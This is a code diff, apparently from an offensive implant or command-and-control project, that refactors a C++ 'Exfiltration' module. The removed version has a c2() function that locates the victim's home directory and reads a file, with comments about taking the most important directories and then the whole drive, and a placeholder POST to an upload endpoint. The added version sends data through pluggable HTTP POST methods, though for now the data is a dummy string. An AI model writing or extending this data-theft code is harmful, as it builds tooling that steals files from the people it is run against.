@@ -1,53 +1,36 @@
-#ifndef EXFILTRATION_HPP
-#define EXFILTRATION_HPP
+#include "modules/Exfiltration.hpp"
+#include "utils/Logger.hpp"
+#include "modules/exfiltration/HttpPost.hpp"
 
-#include <cstdlib>
-
-#include "../utils.hpp"
-
-namespace Exfiltration {
-    int c2() {
-        LOG_INFO("[EXFIL] ENCRYPT FILES")
-
-        const char* homeEnv = std::getenv("HOME");
-        if (homeEnv == nullptr) {
-            LOG_ERROR("Couldn't find $HOME - unable to continue")
-            return 1;
-        }
-
-        // for now test on one file
-        // full version would go through the most important directories first
-        // then exfil whole drive if wanted
-        std::string homeDir(homeEnv);
-        std::string filename = ".test";
-        std::string fullPath = homeDir + "/" + filename;
-
-        std::filesystem::path pathObj(fullPath);
-        if (!std::filesystem::exists(pathObj)) {
-            LOG_ERROR("file doesnt exist {}", fullPath)
-            return false;
-        }
-        
-        std::fstream file(pathObj, std::ios::binary | std::ios::in | std::ios::out);
-        if (!file.is_open()) {
-            LOG_ERROR("failed to open file {}", fullPath)
-            return false;
-        }
-
-        std::vector<char> buffer(CHUNK_SIZE);
-
-        file.read(buffer.data(), CHUNK_SIZE);
-        std::streamsize bytesRead = file.gcount();
-
-        if (bytesRead == 0) {
-            LOG_ALERT("FILE WAS EMPTY")
-            return false;
-        }
-
-        // POST to /api/v1/ghost/upload
-
-        return 0;
-    }
+Exfiltration::Exfiltration() {
+    methods.push_back(std::make_unique<HttpPostMethod>());
 }
 
-#endif
+bool Exfiltration::execute(const std::string& args) {
+    LOG_INFO("Begin exfiltration")
+
+    if (methods.empty()) {
+        LOG_ERROR("No exfiltration methods available")
+        return false;
+    }
+
+    // dummy for now, think about what should be here instead
+    std::string targetFile = args.empty() ? ".test" : args;
+    std::string data = "some secret data";
+
+    int successCount = 0;
+    for (auto& method : methods) {
+        if (method->canHandle(data.size())) {
+            LOG_INFO("Exfiltrating data via {}", method->getName())
+
+            if (method->send(targetFile, data)) {
+                LOG_SUCCESS("Successfully exfiltrated data via {}", method->getName())
+                successCount++;
+            } else {
+                LOG_ERROR("Failed exfil via {}", method->getName())
+            }
+        }
+    }
+
+    return successCount;
+}
